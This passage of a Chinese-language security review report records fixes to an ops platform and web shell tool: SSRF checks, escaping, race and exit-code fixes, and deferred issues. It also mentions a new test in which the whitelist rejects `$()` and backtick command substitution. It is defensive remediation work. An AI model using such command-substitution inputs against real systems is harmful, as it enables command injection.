| P0-B | B1 B2 B3 B4 | 白名单拒命令替换；`is_forbidden_dir` 拒系统目录/根/UNC；参数值白名单 `PARAM_VALUE_RE`；SSRF `safe_import_url` |
| P0-C | C1 C2 C3 C4 C5 C6 | `esc` 补引号转义 + 新增 `escJs`；`group`/订单 id/任务消息等全部转义 |
| P0-D | D1 D2 D3 D4 D5 D6 D7 | 比对工具格式化中文字面量改 unicode + 字节串实参 `to_text` 归一；上传/发布/平台的 py2 崩溃点 |
| P1-E | E1 E2 E3 E4 E5 | POST 体转 bytes；`raw_sse_proxy` 三态防重放 + EOF 修复；复用连接重设超时 |
| P1-F | F1 F2 F3 F4 F5 | 任务参数回传；user_update 副本写回；审计链落盘后推进；连接池截断不放回；转发重试不排空 |
| P1-G | G1 G2 G3 G4 G5 G6 G7 G8 | keep-alive 残留、会话返回码、分片索引上界、下载错误分支、status 脱敏、落盘 is_within 兜底、Range 后缀、批量下载过滤隐藏文件 |
| P2-高价值 | H1 H2 H5 H6 · I2 I3 I8 I9 I10 I11 · J1 J2 J7 J15 · K2 | 见下「7.3 关键修复说明」 |
| 其它 | 版本升级 + 文档同步 + 验证脚本修复 | 见 7.4 |

### 7.2 未修复（留存，建议单独排期）

- **G9 G10 G11 G12**：会话锁内慢 IO / complete 幂等 / 黑名单子串匹配 / `preexec_fn=os.setsid` 的 fork 安全。
- **H3–H17**（除 H1/H2/H5/H6）：crypto 迭代数/明文前缀、`JsonStore` 缓存引用、`JsonlLog` 跨进程原子、auth 会话开销、task 并发遍历、server 缓存与 CORS 等。
- **I 组其余**（I1 I4 I5 I6 I7 I12–I19）：探测键拼装、转发权限粒度、执行券焚券时序、回滚镜像语义（`/MIR`/`rsync --delete`）、并行 order 锁、`ORDER_EVENTS` 膨胀、手动回滚变量、上传查重 TOCTOU 等。
- **J 组其余**（J3–J6 J8–J14 J16–J20）：`cgi` 依赖与上传上限、大文件读入内存、zip 炸弹防护、临时目录清理、文本比对 `utf-8-sig`/`splitlines` 语义、PPTX 排序、`autojunk` 性能、Flask 500 处理等。
- **K 组其余**（K1 K3–K15）：**K1（token 进 URL）** 需前端整体改 `fetch`+流；其余为上传/SSE 状态机、请求序号、分页重置、登出权限点、diff 页轮询与导出等。

> 说明：以上多为 P2「健壮性 / 资源 / 边界」类，或需要较大改动（K1、H3 密文格式、I12 回滚语义）。为不与本次安全加固混在一起回归，建议按触发频率单独排期；每条均可在上表定位到具体行号与修法。

### 7.3 关键修复说明（本轮新增、非 P0）

- **I8 Windows 备份退出码**：robocopy 成功码为 1~7，原 `&` 链会以 1~7 作为进程退出码被判失败；现链尾 `exit /b 0`（≥8 仍先 `exit /b 1`）。
- **I9 POSIX 备份吞错**：去掉 `cp … || true`，仅「目标目录不存在」视为无需备份，其余 cp 失败一律 `exit 1`。
- **I10 发布单卡 running**：`process()` 收口所有非 `StepFailed` 异常 → run/步骤置 failed，不再永久卡 `running`。
- **I11 连点跑两遍**：`api_orders_run` 的检查与置位放进 `ORDER_LOCK` 临界区。
- **J7 CRC32 碰撞**：jar 条目与三向比对改用 SHA-1 复核内容。
- **J15 Excel 三向冲突**：`get_eq` 由恒 `None` 改为按 sheet 内容签名判等，「共同(冲突)」恢复显示。

### 7.4 版本与文档

- 版本：`ops_Platform` 2.0.8→**2.0.9**、`release_center` 1.3.2→**1.3.3**、`upload_server` 3.3.0→**3.3.1**、`web_shell` 1.3.0→**1.3.1**、`opslib` 1.0.6→**1.0.7**、比对工具 2.0→**2.1**；各文件头部已补变更段，`README.md` / `API_CONTRACT.md` 版本表与详解已同步。
- 验证脚本修复（本身也是缺陷）：`verify_py2_excepts.py` 的 `str.replace` 误报（启发式改为「模块根 + 风险方法」）；`verify_integration.py` 抽取前端函数时补带 `esc`/`escJs`；`verify_web_shell_v12.py` 的版本断言改为从源码读取，并新增「白名单拒绝 `$()`/反引号」用例。
- **回归盲区（本次已修，见 §六.1）**：E1 的 POST 请求体现在真正发出；平台侧 `raw_sse_proxy` 三态返回已使「未写出任何事件才降级」成为可断言行为。
- **仍需注意**：`opslib` / `ops_Platform` 等文件里仍有大量「中文字节串字面量 + `%` 格式化」，它们依赖「数据入口经 `compat.to_native` 归一为字节串」这一项目约定才安全，py3 本机无法暴露。建议保持 `to_native` 约定，或后续用 `verify_py2_excepts.py` 同款静态扫描 + py2 CI 兜底。

---

*本报告原为纯静态审查结论；「七、修复进展」记录的是本轮据其落地的修复。*
